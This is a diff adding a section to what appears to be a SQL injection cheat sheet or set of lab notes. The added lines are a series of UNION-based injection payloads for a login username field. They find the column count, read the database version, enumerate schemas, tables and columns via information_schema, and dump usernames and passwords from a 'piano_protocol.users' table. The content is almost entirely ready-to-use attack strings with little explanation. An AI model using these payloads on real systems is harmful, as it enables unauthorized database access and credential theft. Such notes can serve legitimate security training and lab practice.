@@ -367,6 +367,26 @@ z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+fro
 z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+from+information_schema.columns+where+table_schema='exercise'+and+table_name='secrets';),2,3,4--+
 
 ```
+SQLI in login username:
+
+```
+ad' UNION ALL SELECT NULL,1,NULL,NULL,NULL,NULL#
+
+ad' UNION ALL SELECT NULL,version(),NULL,NULL,NULL,NULL#
+
+ad' UNION ALL select 1,group_concat(distinct(table_schema) separator ', '),1,1,1,1 from information_schema.tables#
+
+
+ad' UNION ALL select 1,group_concat(distinct(table_name) separator ', '),1,1,1,1 from information_schema.tables where table_schema='piano_protocol'#
+
+
+ad' UNION ALL select 1,group_concat(distinct(column_name) separator ', '),1,1,1,1 from information_schema.columns where table_schema='piano_protocol' and table_name='users'#
+
+
+ad' UNION ALL select 1,concat(username," ",password ),1,1,1,1 from piano_protocol.users#
+
+```
+
 
 ###### Stacked Queries
 
